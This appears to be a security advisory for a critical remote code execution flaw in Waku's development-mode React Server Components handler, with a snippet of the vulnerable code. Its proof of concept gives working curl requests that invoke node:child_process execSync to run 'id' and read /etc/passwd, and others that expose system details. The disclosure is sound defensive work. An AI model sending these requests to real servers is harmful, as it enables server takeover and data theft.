### Summary

  A vulnerability in Waku's development mode RSC (React Server Components) handler allows unauthenticated attackers to import and invoke arbitrary Node.js built-in modules, including `child_process`. This enables **Remote Code Execution (RCE)** - attackers can execute arbitrary shell commands on the server.

  ### Severity

  **Critical** - CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

  ### Affected Versions

  - **Vulnerable**: <= 0.21.24
  - **Patched**: 0.27.4

  ### Vulnerable Code

  **File:** `waku/dist/lib/middleware/handler.js`

  The RSC handler decodes function IDs from URL paths and passes them directly to module loading without validation:

  const funcId = decodeFuncId(rscPath);
  if (funcId) {
      const [fileId, name] = funcId.split('#');
      const mod = await loadServerModule(fileId);  // NO VALIDATION
      return { type: 'function', fn: mod[name], args, req: ctx.req };
  }

  Proof of Concept

  Remote Code Execution:
  # Execute 'id' command
  curl -s -X POST 'http://localhost:3004/RSC/F/node:child_process/execSync.txt' \
    -H 'Content-Type: application/json' \
    -d '["id"]'

  # Response (decoded): uid=1000(kali) gid=1000(kali) groups=...

  # Read /etc/passwd
  curl -s -X POST 'http://localhost:3004/RSC/F/node:child_process/execSync.txt' \
    -H 'Content-Type: application/json' \
    -d '["cat /etc/passwd"]'

  Information Disclosure:
  curl -s 'http://localhost:3004/RSC/F/node:os/networkInterfaces.txt'
  curl -s 'http://localhost:3004/RSC/F/node:process/cwd.txt'

  Impact

  - Remote Code Execution: Execute arbitrary shell commands
  - Full Server Compromise: Data exfiltration, malware installation, lateral movement
  - Information Disclosure: Network topology, user info, filesystem paths

  Remediation

  Upgrade to version 0.27.4 or later. The fix adds rsc:reference-validation plugin that blocks node: protocol imports.

  Credit

  Michael Groberman
